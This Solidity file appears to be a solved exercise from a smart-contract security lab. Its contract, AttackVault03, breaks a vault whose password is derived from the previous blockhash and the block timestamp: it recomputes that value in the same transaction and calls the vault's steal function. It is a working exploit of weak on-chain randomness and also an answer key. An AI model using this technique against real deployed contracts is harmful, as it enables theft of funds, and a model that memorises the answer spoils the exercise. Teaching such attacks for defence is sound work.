// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVault03 {
    function steal(bytes32 _password) external returns (bool);
}

contract AttackVault03 {
    IVault03 public vault;

    // Constructor to set the address of the vault contract
    constructor(address _vaultAddress) {
        vault = IVault03(_vaultAddress);
    }

    // Function to perform the attack
    function attack() external returns (bool) {
        // =========================
        // YOUR CODE GOES HERE
        // vault.unlock(password);

        // Compute the password using on-chain values in the same transaction.
        bytes32 password = keccak256(
            abi.encodePacked(blockhash(block.number - 1), block.timestamp)
        );

        // Call the unlock function of the vault contract with the computed password
        return vault.steal(password);
        // =========================
    }
}
